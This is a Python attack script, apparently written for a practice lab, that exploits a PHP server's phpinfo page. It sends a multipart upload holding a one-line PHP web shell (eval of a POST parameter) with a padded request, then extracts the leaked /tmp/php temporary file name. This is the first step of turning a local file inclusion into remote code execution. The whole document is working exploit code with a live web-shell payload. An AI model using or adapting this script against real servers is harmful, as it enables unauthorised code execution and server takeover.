import socket
import re
# ========== 这里改成你的靶场信息 ==========
TARGET_IP = "192.168.147.128"
TARGET_PORT = 8080
PATH = "/phpinfo.php"

garbage = "A" * 60000
boundary = b"----WebKitFormBoundaryABC123XYZ"
shell_data = b'<?php eval($_POST["cmd"]);?>'

body = (
    boundary + b"\r\n"
    b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
    b'Content-Type: text/plain\r\n'
    b'\r\n'
    + shell_data + b'\r\n'
    + boundary + b"--\r\n"
)
body_len = len(body)

header = (
    f"POST {PATH}?a={garbage} HTTP/1.1\r\n"
    f"Host: {TARGET_IP}\r\n"
    f"Content-Length: {body_len}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
    f"\r\n"
).encode("utf-8")

packet = header + body

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(packet)

# 一次性读完
full_data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    full_data += chunk
s.close()

text = full_data.decode("utf-8", errors="ignore")
print("===== 全部响应已经接收完成 =====")

# 匹配临时文件名
pattern = re.compile(r"/tmp/php[0-9a-zA-Z]{6}")
match = pattern.search(text)
if match:
    print(f"✅ 找到 tmp_name：{match.group()}")
else:
    print("❌ 在整个响应里没有找到 /tmp/phpxxxx，大概率 enable_post_data_reading=Off")

# 可选：打印 $_FILES 附近一小段内容，方便观察
files_match = re.search(r"\$_FILES.*?Array.*?\)", text, re.S)
if files_match:
    print("\n===== $_FILES 区域 =====")
    print(files_match.group())